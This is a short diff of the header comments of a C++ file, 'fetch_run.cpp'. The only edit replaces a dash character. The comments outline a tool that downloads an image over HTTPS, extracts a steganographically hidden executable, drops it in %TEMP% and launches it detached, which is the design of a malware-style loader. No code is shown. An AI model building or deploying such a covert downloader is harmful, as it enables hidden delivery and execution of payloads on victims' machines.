@@ -1,4 +1,4 @@
-// fetch_run.cpp — template: download image -> decode -> execute payload.
+// fetch_run.cpp - template: download image -> decode -> execute payload.
 // Usage: fetch_run.exe <https-url> <out-name> [--password P] [--wait] [--keep]
 // Flow: WinINet GET -> GDI+ RGB -> stego::Decode -> %TEMP% drop ->
 //   magic check (MZ) -> CreateProcess detached (or --wait for exit code).
